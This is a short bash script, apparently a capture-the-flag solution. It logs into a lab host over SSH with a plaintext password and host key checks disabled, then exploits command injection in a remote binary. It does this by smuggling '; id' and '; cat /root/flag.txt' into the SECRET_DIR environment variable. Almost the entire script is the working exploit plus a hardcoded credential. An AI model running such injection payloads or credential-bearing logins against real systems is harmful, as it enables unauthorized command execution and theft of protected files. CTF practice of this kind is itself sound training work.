#!/bin/bash
export SSHPASS=6313d317
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 28959 ctf-player@xebec.cylabacademy.net"
echo "=== test avec /root ==="
$SSH 'SECRET_DIR=/root ./bin 2>&1 | head -10' 2>&1 | tail -12
echo "=== injection : id ==="
$SSH 'SECRET_DIR="/root; id" ./bin 2>&1 | head -10' 2>&1 | tail -12
echo "=== injection : cat flag ==="
$SSH 'SECRET_DIR="/root; cat /root/flag.txt" ./bin 2>&1 | head -10' 2>&1 | tail -12
